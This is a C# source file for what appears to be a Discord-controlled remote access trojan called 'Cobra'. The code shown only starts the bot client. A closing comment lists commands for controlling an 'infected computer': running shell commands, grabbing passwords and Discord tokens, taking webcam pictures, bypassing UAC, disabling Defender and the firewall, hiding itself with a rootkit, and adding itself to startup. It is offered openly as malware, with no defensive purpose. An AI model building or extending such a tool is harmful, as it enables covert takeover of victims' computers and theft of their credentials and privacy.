using Cobra.Helpers.Initializer;
using Discord.WebSocket;
using System;
using Discord.Commands;
using System.Reflection;


namespace Cobra
{
    internal class CobraMain
    {
// t
    private DiscordSocketClient CobraClient;
    private CommandService CobraCommandService;
    public static Task Main() => new CobraMain().InitializeBot();


    public async Task InitializeBot() {

        Console.WriteLine("Starting....");

        CobraClient = new DiscordSocketClient();
        CobraCommandService = new CommandService();

        await CobraCommandService.AddModuleAsync<Test>(null);




        await CobraInitializor.Initialize(CobraClient);



        await Task.Delay(-1);

    }
    
    }
}


/*
Available commands are :
--> !message = Show a message box displaying your text / Syntax  = "!message example"
--> !shell = Execute a shell command /Syntax  = "!shell whoami"
--> !voice = Make a voice say outloud a custom sentence / Syntax = "!voice test"
--> !admincheck = Check if program has admin privileges
--> !cd = Changes directory
--> !dir = display all items in current dir
--> !download = Download a file from infected computer
--> !upload = Upload file to the infected computer / Syntax = "!upload file.png" (with attachment)
--> !uploadlink = Upload file to the infected computer / Syntax = "!upload link file.png"
--> !delete = deletes a file / Syntax = "!delete / path to / the / file.txt"
--> !write = Type your desired sentence on computer
--> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper" (with attachment)
--> !clipboard = Retrieve infected computer clipboard content
--> !idletime = Get the idle time of user's on target computer
--> !currentdir = display the current dir
--> !block = Blocks user's keyboard and mouse / Warning : Admin rights are required
--> !unblock = Unblocks user's keyboard and mouse / Warning : Admin rights are required
--> !screenshot = Get the screenshot of the user's current screen
--> !exit = Exit program
--> !kill = Kill a session or all sessions / Syntax = "!kill session-3" or "!kill all"
--> !uacbypass = attempt to bypass uac to gain admin by using windir and slui
--> !shutdown = shutdown computer
--> !restart = restart computer
--> !logoff = log off current user
--> !bluescreen = BlueScreen PC
--> !datetime = display system date and time
--> !prockill = kill a process by name / syntax = "!kill process"
--> !disabledefender = Disable windows defender(requires admin)
--> !disablefirewall = Disable windows firewall(requires admin)
--> !audio = play a audio file on the target computer / Syntax = "!audio" (with attachment)
--> !critproc = make program a critical process. meaning if its closed the computer will bluescreen(Admin rights are required)
--> !uncritproc = if the process is a critical process it will no longer be a critical process meaning it can be closed without bluescreening(Admin rights are required)
--> !website = open a website on the infected computer / syntax = "!website www.google.com"
--> !disabletaskmgr = disable task manager(Admin rights are required)
--> !enabletaskmgr = enable task manager(if disabled)(Admin rights are required)
--> !startup = add to startup(when computer go on this file starts)
--> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise
--> !listprocess = Get all process's
--> !password = grab all passwords
--> !rootkit = Launch a rootkit (the process will be hidden from taskmgr and you wont be able to see the file)(Admin rights are required)
--> !unrootkit = Remove the rootkit(Admin rights are required)
--> !getcams = Grab the cameras names and their respected selection number
--> !selectcam = Select camera to take a picture out of (default will be camera 1)/ Syntax "!selectcam 1"
--> !webcampic = Take a picture out of the selected webcam
--> !grabtokens = Grab all discord tokens on the current pc
--> !help = This help menu

*/